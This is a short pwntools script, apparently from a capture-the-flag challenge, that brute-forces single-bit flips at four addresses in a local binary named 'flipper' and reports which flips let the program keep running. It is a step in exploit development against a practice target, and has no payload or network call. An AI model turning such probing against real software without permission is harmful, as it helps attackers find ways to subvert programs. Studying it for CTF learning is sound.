from pwn import *

for addr in range(0x004012D8 + 1, 0x004012D8 + 5):
    for bit in range(8):
        io = process("./flipper")
        io.sendlineafter(b"flip?", f"{hex(addr)} {bit}".encode())
        try:
            io.recvuntil(b"Done.\n")
            io.recvline()
        except EOFError:
            continue
        else:
            success(f"{hex(addr)} {bit}")
        finally:
            io.close()
